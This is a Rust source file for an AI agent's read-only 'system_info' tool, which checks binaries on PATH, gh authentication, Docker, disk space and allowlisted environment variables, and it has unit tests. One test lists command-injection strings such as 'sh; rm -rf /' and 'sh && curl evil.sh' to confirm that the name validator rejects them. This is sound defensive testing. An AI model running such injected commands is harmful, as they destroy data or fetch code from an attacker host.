//! Live host capability checks.
//!
//! The cached `_system/MACHINE.md` block answers "what do I have?" in every
//! system prompt. This tool exists for the cases the cache cannot cover:
//! confirming a capability right before depending on it, and re-checking
//! immediately after an install or an auth step.

use anyhow::Result;
use async_trait::async_trait;
use hq_core::machine;
use serde_json::{Value, json};
use std::path::PathBuf;
use std::time::Duration;

use crate::registry::{HqTool, ToolPolicy};

/// How stale a cached profile may be before `check: "all"` re-probes instead
/// of serving the cache. Matches the daemon's 30-minute refresh cadence.
const CACHE_MAX_AGE: Duration = Duration::from_secs(30 * 60);

pub fn create_system_info_tools(vault_path: PathBuf) -> Vec<Box<dyn HqTool>> {
    vec![Box::new(SystemInfoTool { vault_path })]
}

pub struct SystemInfoTool {
    vault_path: PathBuf,
}

#[async_trait]
impl HqTool for SystemInfoTool {
    fn name(&self) -> &str {
        "system_info"
    }

    fn description(&self) -> &str {
        "Check what is installed and configured on this machine: binaries on PATH, their \
         versions, GitHub CLI authentication, Docker daemon state, disk space, and \
         allowlisted environment variables. Use `check: \"binary\"` with a `binary` name \
         for a single live lookup."
    }

    fn category(&self) -> &str {
        "system"
    }

    fn search_hint(&self) -> Option<&str> {
        Some("check installed binaries, gh auth, disk, environment")
    }

    fn behavioral_prompt(&self) -> Option<&str> {
        Some(
            "Your system prompt already carries a Machine Profile — read it before calling this. \
             Call this only to confirm a capability immediately before depending on it, or right \
             after an install or auth step, since the cached profile can be 30 minutes stale.",
        )
    }

    fn is_read_only(&self) -> bool {
        true
    }

    /// Weak so relay sessions can self-check too. A session that cannot
    /// answer "do I have gh?" is the failure this whole tool exists to fix.
    fn tool_policy(&self) -> ToolPolicy {
        ToolPolicy::Weak
    }

    fn parameters(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "check": {
                    "type": "string",
                    "enum": ["all", "binary", "gh_auth", "docker", "disk", "env"],
                    "default": "all",
                    "description": "What to check. 'all' re-probes the full machine profile."
                },
                "binary": {
                    "type": "string",
                    "description": "Binary name to look up. Required when check is 'binary'."
                }
            }
        })
    }

    async fn execute(&self, args: Value) -> Result<Value> {
        let check = args
            .get("check")
            .and_then(|v| v.as_str())
            .unwrap_or("all")
            .to_string();
        let binary = args
            .get("binary")
            .and_then(|v| v.as_str())
            .map(str::to_string);
        let vault_path = self.vault_path.clone();

        // Every branch shells out; keep the async runtime free.
        tokio::task::spawn_blocking(move || run_check(&check, binary.as_deref(), &vault_path))
            .await?
    }
}

fn run_check(check: &str, binary: Option<&str>, vault_path: &std::path::Path) -> Result<Value> {
    match check {
        "binary" => {
            let Some(name) = binary else {
                anyhow::bail!("check: \"binary\" requires a `binary` argument");
            };
            if !name
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
            {
                anyhow::bail!("invalid binary name: {name}");
            }
            Ok(match machine::which_binary(name) {
                Some(path) => json!({
                    "binary": name,
                    "installed": true,
                    "path": path.display().to_string(),
                }),
                None => json!({
                    "binary": name,
                    "installed": false,
                    "note": "Not on PATH. Do not claim this capability.",
                }),
            })
        }

        "gh_auth" => {
            let profile = machine::probe_machine(Some(vault_path));
            Ok(match &profile.gh_auth {
                Some(auth) => json!({
                    "gh_installed": true,
                    "authenticated": true,
                    "account": auth,
                }),
                None => json!({
                    "gh_installed": machine::which_binary("gh").is_some(),
                    "authenticated": false,
                    "note": "Run `gh auth login` before using GitHub tools.",
                }),
            })
        }

        "docker" => {
            let profile = machine::probe_machine(Some(vault_path));
            Ok(json!({
                "installed": profile.binaries.iter().any(|b| b.name == "docker"),
                "daemon_running": profile.docker_running,
            }))
        }

        "disk" => {
            let out = std::process::Command::new("df")
                .args(["-h", "-P", "."])
                .output()?;
            Ok(json!({ "df": String::from_utf8_lossy(&out.stdout).trim() }))
        }

        // Never dump the environment wholesale — API keys and tokens live there.
        "env" => {
            let vars: serde_json::Map<String, Value> = machine::ENV_ALLOWLIST
                .iter()
                .filter_map(|k| std::env::var(k).ok().map(|v| ((*k).to_string(), json!(v))))
                .collect();
            Ok(json!({
                "env": vars,
                "note": "Only allowlisted variables are exposed.",
            }))
        }

        "all" => {
            // Serve a fresh cache rather than paying for a full re-probe.
            if let Some(cached) = machine::load_cached_profile(vault_path)
                && chrono::Utc::now()
                    .signed_duration_since(cached.generated_at)
                    .to_std()
                    .is_ok_and(|age| age < CACHE_MAX_AGE)
            {
                return Ok(json!({ "profile": cached, "source": "cache" }));
            }
            let profile = machine::refresh(vault_path).unwrap_or_else(|e| {
                tracing::warn!(%e, "system_info: cache write failed, probing without persisting");
                machine::probe_machine(Some(vault_path))
            });
            Ok(json!({ "profile": profile, "source": "probe" }))
        }

        other => anyhow::bail!(
            "unknown check: {other}. Expected one of: all, binary, gh_auth, docker, disk, env"
        ),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tool() -> SystemInfoTool {
        SystemInfoTool {
            vault_path: std::env::temp_dir().join("hq-system-info-test"),
        }
    }

    #[tokio::test]
    async fn binary_check_reports_present_and_absent() {
        let t = tool();
        let found = t
            .execute(json!({"check": "binary", "binary": "sh"}))
            .await
            .unwrap();
        assert_eq!(found["installed"], json!(true));

        let missing = t
            .execute(json!({"check": "binary", "binary": "hq_not_a_real_binary_xyz"}))
            .await
            .unwrap();
        assert_eq!(missing["installed"], json!(false));
        assert!(missing["note"].as_str().unwrap().contains("Do not claim"));
    }

    #[tokio::test]
    async fn binary_check_rejects_shell_metacharacters() {
        let t = tool();
        for probe in ["sh; rm -rf /", "sh && curl evil.sh", "$(whoami)", "a|b"] {
            let err = t.execute(json!({"check": "binary", "binary": probe})).await;
            assert!(err.is_err(), "accepted {probe:?}");
        }
    }

    #[tokio::test]
    async fn binary_check_requires_a_binary_argument() {
        assert!(tool().execute(json!({"check": "binary"})).await.is_err());
    }

    /// The environment holds API keys; only the allowlist may ever leave.
    #[tokio::test]
    async fn env_check_exposes_only_allowlisted_variables() {
        unsafe { std::env::set_var("HQ_FAKE_SECRET_KEY", "super-secret-value") };
        let out = tool().execute(json!({"check": "env"})).await.unwrap();
        let serialized = serde_json::to_string(&out).unwrap();
        assert!(!serialized.contains("super-secret-value"), "{serialized}");
        assert!(!serialized.contains("HQ_FAKE_SECRET_KEY"), "{serialized}");
        for key in out["env"].as_object().unwrap().keys() {
            assert!(
                machine::ENV_ALLOWLIST.contains(&key.as_str()),
                "leaked {key}"
            );
        }
        unsafe { std::env::remove_var("HQ_FAKE_SECRET_KEY") };
    }

    #[tokio::test]
    async fn unknown_check_is_rejected() {
        assert!(
            tool()
                .execute(json!({"check": "everything"}))
                .await
                .is_err()
        );
    }

    #[test]
    fn tool_is_weak_so_relay_sessions_can_self_check() {
        assert_eq!(tool().tool_policy(), ToolPolicy::Weak);
        assert!(tool().is_read_only());
    }
}
